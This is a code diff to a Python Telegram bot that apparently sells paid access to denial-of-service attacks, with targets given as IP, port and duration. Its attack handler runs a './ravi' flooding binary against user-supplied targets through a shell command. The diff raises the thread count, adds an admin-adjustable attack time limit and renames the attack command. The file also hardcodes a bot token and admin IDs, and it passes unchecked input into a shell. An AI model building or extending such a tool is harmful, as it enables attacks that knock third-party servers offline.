@@ -16,11 +16,13 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton  # ✅ FIXE
 bot = telebot.TeleBot('7712914052:AAHowCymSw9WSz9SzDsOydhXhDcIMKsdrrs')
 
 # ✅ GROUP AND ADMIN DETAILS
-GROUP_ID = "-4611762264"
+GROUP_ID = "-4735923961"
 ADMINS = ["7129010361"]
-ADMINS = [7129010361]
-
+ADMIN_IDS = [7129010361]
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
+
+# Default max duration (in seconds)
+MAX_DURATION = 300
 
 # ✅ FILE PATHS
 USER_FILE = "users.txt"
@@ -184,7 +186,7 @@ def help_callback(call):
 👤 **USER COMMANDS:**  
 🔹 `/myinfo` - अपना स्टेटस और Key की Expiry चेक करो  
 🔹 `/redeem <KEY>` - एक्सेस पाने के लिए Key रिडीम करो  
-🔹 `/bgmi <IP> <PORT> <TIME>` - अटैक स्टार्ट करो  
+🔹 `/RS <IP> <PORT> <TIME>` - अटैक स्टार्ट करो  
 
 👑 **ADMIN COMMANDS:**  
 🔹 `/genkey <DAYS> [HOURS]` - नई Key बनाओ  
@@ -233,22 +235,69 @@ def generate_new_key(message):
 
     bot.reply_to(message, f"✅ NEW KEY GENERATED:\n?? `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")
 
-# ✅ /REMOVEKEY Command (Admin Only)
-@bot.message_handler(commands=['removekey'])
-def remove_existing_key(message):
-    if str(message.from_user.id) not in ADMINS:
-         bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
+# Example fix for /removekey (Make sure only admin can use it)
 
-    command = message.text.split()
+# max time 
 
-    if len(command) != 2:
-        bot.reply_to(message, "⚠ USAGE: /removekey <KEY>")
-        return 
+@bot.message_handler(commands=['maxtime'])
+def set_max_duration(message):
+    global MAX_DURATION
+    user_id = message.from_user.id  # Get user ID
+    
+    if user_id in ADMIN_IDS:  # Check if user is an admin
+        try:
+            command_parts = message.text.split()
+            if len(command_parts) != 2:
+                bot.reply_to(message, "Usage: /setmaxduration [seconds]")
+                return
 
-    if remove_key(command[1]):
-        bot.reply_to(message, "✅ KEY REMOVED SUCCESSFULLY!")
+            new_duration = int(command_parts[1])
+            if new_duration <= 0:
+                bot.reply_to(message, "Duration must be a positive number!")
+                return
+
+            MAX_DURATION = new_duration
+            bot.reply_to(message, f"Max duration updated to {MAX_DURATION} seconds!")
+        except ValueError:
+            bot.reply_to(message, "Invalid number! Please enter a valid duration in seconds.")
     else:
-        bot.reply_to(message, "❌ KEY NOT FOUND!")
+        bot.reply_to(message,  "❌❌❌ ONLY MY OWNER !")
+
+@bot.message_handler(commands=['removekey'])
+def remove_key(message):
+    user_id = str(message.from_user.id)
+
+    # ✅ Ensure command runs only in private chat
+    if message.chat.type != "private":
+        bot.reply_to(message, "🚫 **THIS COMMAND ONLY WORKS IN BOT'S PRIVATE CHAT!** ❌")
+        return  
+
+    if str(message.from_user.id) not in ADMINS:
+        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
+        return
+
+    command_parts = message.text.split()
+    
+    # ✅ Check if user provided a key name
+    if len(command_parts) != 2:
+        bot.reply_to(message, "⚠ **USAGE:** /REMOVEKEY <KEY_NAME>")
+        return
+
+    key_to_remove = command_parts[1]
+
+    # ✅ Check if the key exists in the database
+    if key_to_remove not in bot_keys:
+        bot.reply_to(message, f"❌ **KEY `{key_to_remove}` NOT FOUND!**")
+        return
+
+    # ✅ Remove the key from the database
+    del bot_keys[key_to_remove]
+
+    # ✅ Confirm the removal
+    bot.reply_to(message, f"✅ **KEY `{key_to_remove}` REMOVED SUCCESSFULLY!**")
+
+# Define your ADMIN_IDS list
+ADMIN_IDS = [7129010361]  # Replace with actual admin user IDs
 
 # ✅ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
 @bot.message_handler(content_types=['photo'])
@@ -354,7 +403,7 @@ def handle_attack(message):
     chat_id = str(message.chat.id)
 
     if not is_user_allowed(user_id):  # ✅ Expired Key Check
-        bot.reply_to(message, "⏳ **PEHLE KEY BUY KRO**")
+        bot.reply_to(message, "⏳ **PEHLW KEY BUY KRO**")
 
     if chat_id != GROUP_ID:
         bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
@@ -378,15 +427,15 @@ def handle_attack(message):
         bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
         return
 
-    if time_duration > 300:
-        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 300 SECONDS!")
-        return
+    if time_duration > MAX_DURATION:  # Use admin-set MAX_DURATION
+            bot.reply_to(message, f"🚫 MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
+            return
 
     if user_id not in active_attacks:
         active_attacks[user_id] = []
 
-    if len(active_attacks[user_id]) >= 3:
-        bot.reply_to(message, "❌ MAXIMUM 3 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
+    if len(active_attacks[user_id]) >= 2:
+        bot.reply_to(message, "❌ MAXIMUM 2 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
         return
 
     end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
@@ -396,7 +445,7 @@ def handle_attack(message):
 
     def attack_execution():
         try:
-            subprocess.run(f"./ravi {target} {port} {time_duration} 1000", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./ravi {target} {port} {time_duration} 2000", shell=True, check=True, timeout=time_duration)
         except subprocess.TimeoutExpired:
             bot.reply_to(message, "❌ ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
         except subprocess.CalledProcessError:
